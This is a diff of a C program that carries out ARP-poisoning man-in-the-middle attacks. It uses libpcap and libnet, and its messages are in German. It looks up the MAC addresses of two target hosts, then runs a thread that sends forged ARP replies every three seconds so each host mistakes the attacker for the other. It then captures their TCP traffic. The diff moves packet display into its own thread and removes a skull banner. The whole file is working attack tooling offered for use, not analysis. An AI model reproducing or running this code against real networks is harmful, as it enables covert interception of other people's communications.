@@ -1,42 +1,18 @@
 #include "header/arp.h"
+#include "header/display.h"
 #include <pcap.h>
 #include "header/hacking.h"
 #include <unistd.h>
 #include <pthread.h>
 #include <netinet/ether.h>
 
-
-void set_packet_filter(pcap_t *handle, char *filter_opt);
-
 void* arp_poison_thread(void *arg_ptr);
-
-struct data_pass
-{
-    libnet_t* l;
-    uint32_t target1_ip, target2_ip;
-    uint8_t *target1_mac, *target2_mac;
-
-};
 
 void usage(char* name)
 {
     printf("Usage: %s <IP of Target A> <IP of Target B>\n", name);
     exit(0);
 }
-
-char pic[] =
-"                      ______\n"
-"                   .-"      "-.\n"
-"                  /           \\\n"
-"                 |              |\n"
-"                 |,  .-.  .-.  ,|\n"
-"                 | )(_\e[0;31mo\033[39m/  \\\e[0;31mo\033[39m_)( |\n"
-"                 |/     /\\     \\|\n"
-"       (@_       (_     ^^     _)\n"
-"  _     ) \\_______\\__|IIIIII|__/__________________________\n"
-" (_)@8@8{}<________|-\\IIIIII/-|___________________________>\n"
-"        )_/        \\          /\n"
-"       (@           `--------`\n";
 
 
 #define ARP_POISON_FREQUENCY 3
@@ -57,17 +33,20 @@ int main(int argc, char *argv[])
     uint8_t *target2_mac;
 
     // Connection
-    const u_char *packet;
-    const u_char *data;
     char filter_str[200];
-    const struct libnet_tcp_hdr *tcp_header;
-    const struct libnet_ipv4_hdr *ip_header;
+    const struct libnet_tcp_hdr tcp_header;
+    const struct libnet_ipv4_hdr ip_header;
 
     // Multithreading
-    struct data_pass poison_data;
+    struct poison_pass poison_data;
     pthread_t t_poison;
 
+    struct display_pass display_data;
+    pthread_t t_display;
 
+    
+
+    // Not enough arguments, show usage
     if(argc < 3)
         usage(argv[0]);
 
@@ -89,7 +68,7 @@ int main(int argc, char *argv[])
         fatal(libnet_geterror(l));
     
     
-
+    // Output the network interface which will be used
     printf("Netzwerkschnittstelle ist %s\n", ift->name);
     
 
@@ -101,36 +80,36 @@ int main(int argc, char *argv[])
     /* 
         Get MAC-Addresses from Targets 
     */
-
+   
     // Set packet filter for incoming ARP-Packets
     set_packet_filter(handle, "arp");
     
     // Request Target 1
-    printf("\nZiel \033[32m%s\033[39m: sende ARP-requests... \n", argv[1]);
+    printf("\n%s: sende ARP-requests... \n", argv[1]);
     arp_request(target1_ip, l);
 
     // Receive Target 1
-    printf("\033[32m%s\033[39m: suche nach ARP-replys...\n", argv[1]);
+    printf("%s: suche nach ARP-replys...\n", argv[1]);
 
     /* Loop goes on until a matching ARP-reply is found */
-
-    while(arp_receive(handle, target1_ip, target2_mac) != 0) {sleep(1); arp_request(target1_ip, l);}
+    while(arp_receive(handle, target1_ip, target1_mac) != 0) {sleep(1); arp_request(target1_ip, l);}
     
     printf("\n-------------------------------\n\n");
 
     // Request Target 2
-    printf("\033[34m%s\033[39m: sende ARP-requests... \n", argv[2]);
+    printf("%s: sende ARP-requests... \n", argv[2]);
     arp_request(target2_ip, l);
 
     // Receive Target 2
-    printf("\033[34m%s\033[39m: suche nach ARP-replys...\n", argv[2]);
+    printf("%s: suche nach ARP-replys...\n", argv[2]);
+    /* Loop goes on until a matching ARP-reply is found */
     while(arp_receive(handle, target2_ip, target2_mac) != 0) {sleep(1); arp_request(target2_ip, l);}
 
     /* 
         Start ARP-Poisoning on different thread
     */  
 
-    printf("\n\t sendet ARP-Replies aller %d Sekunden. ^^\n%s\n", ARP_POISON_FREQUENCY, pic);
+    printf("\nSendet ARP-Replies aller %d Sekunden. \n\n", ARP_POISON_FREQUENCY);
 
     poison_data.l = l;
     poison_data.target1_ip = target1_ip;
@@ -140,6 +119,11 @@ int main(int argc, char *argv[])
 
     // create new thread for executing the arp_poison function
     pthread_create(&t_poison, NULL, arp_poison_thread , (void *)&poison_data);
+
+
+    /*
+        Prepare to display messages on different thread
+    */
 
     // make filter for tcp
     strcpy(filter_str, "(src host ");
@@ -151,13 +135,23 @@ int main(int argc, char *argv[])
     strcat(filter_str, " or src host ");
     strcat(filter_str, argv[2]);
     strcat(filter_str, ")");
-    // Set packet filter for TCP
+
+    // set packet filter for TCP
     set_packet_filter(handle, filter_str);
-    //set_packet_filter(handle, "tcp"); // just for testing
+    //set_packet_filter(handle, "tcp");
+    
+    // fill display_data struct
+    display_data.handle = handle;
+    display_data.tcp_header = &tcp_header;
+    display_data.ip_header = &ip_header;
+
+    // create new thread for executing the display function
+    pthread_create(&t_display, NULL, display , (void *)&display_data);
 
     // main loop intercepting packets and displaying them
     while(1)
     {
+        /*
         packet = pcap_next(handle, &pkthdr);
         printf("got %d bytes packet\n", pkthdr.len);
         ip_header = (struct libnet_ipv4_hdr *)(packet + ETHER_HDR_LEN + 2); // no idea why it is off by 2
@@ -184,37 +178,19 @@ int main(int argc, char *argv[])
         }
         printf("\n");
         //fflush(stdout);
+        */
     }
     
 }
 
-void set_packet_filter(pcap_t *handle, char *filter_opt)
-{
-    struct bpf_program filter;
-    char filter_string[200];
-    strncpy(filter_string, filter_opt, 200);
-    printf("[DEBUG] filter string ist %s\n", filter_string);
-
-    if(pcap_compile(handle, &filter, filter_string, 0, 0) == -1)
-    {
-        perror("compile filter error");
-        exit(EXIT_FAILURE);
-    }
-
-    if(pcap_setfilter(handle, &filter) == -1)
-    {
-        perror("setting filter error");
-        exit(EXIT_FAILURE);
-    }
-
-}
 
 void * arp_poison_thread(void *arg_ptr)
 {
 
-    struct data_pass *passed_data = arg_ptr;
+    struct poison_pass *passed_data = arg_ptr;
     while(1) 
     {
+        
         sleep(ARP_POISON_FREQUENCY);
         //send a fake arp-reply to target 1 pretending to be target 2
         arp_reply(passed_data->target2_ip, passed_data->target1_ip, passed_data->target1_mac, passed_data->l);
